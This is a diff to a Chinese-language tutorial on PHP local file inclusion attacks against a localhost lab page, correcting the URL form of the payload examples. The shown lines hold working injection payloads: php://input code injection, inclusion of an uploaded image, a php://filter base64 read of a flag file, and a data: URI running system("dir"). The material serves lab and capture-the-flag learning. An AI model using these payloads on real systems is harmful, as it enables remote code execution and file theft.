@@ -19,7 +19,7 @@
 ###### GET 参数：
 
 ```http
-/?action=php://input
+?action=php://input
 ```
 
 ###### Post 参数:
@@ -37,7 +37,7 @@
 ###### http形式的完整注入payload如下:
 
 ```http
-POST /labs/IncludeAttack/demo.php/?action=php://input HTTP/1.1
+POST /labs/IncludeAttack/demo.php?action=php://input HTTP/1.1
 Host: localhost
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
@@ -77,7 +77,7 @@ file_get_contents('php://input');
 ###### GET参数
 
 ```http
-/?action=virus.jpg
+?action=virus.jpg
 ```
 
 ###### POST参数
@@ -93,7 +93,7 @@ pwd=system("dir");
 ###### GET 参数
 
 ```http
-php://filter/read=convert.base64-encode/resource=../../flag.txt
+?action=php://filter/read=convert.base64-encode/resource=../../flag.txt
 ```
 
  回显内容是该路径下文件的base64加密格式.
@@ -108,6 +108,6 @@ php://filter/read=convert.base64-encode/resource=../../flag.txt
 
 ```http
 // data: text/plain,<?php system("dir");?>
-/?action=data%3a+text/plain,<%3fphp+system+%28"dir"%29%3b+%3f>
+?action=data%3a+text/plain,<%3fphp+system+%28"dir"%29%3b+%3f>
 ```
 
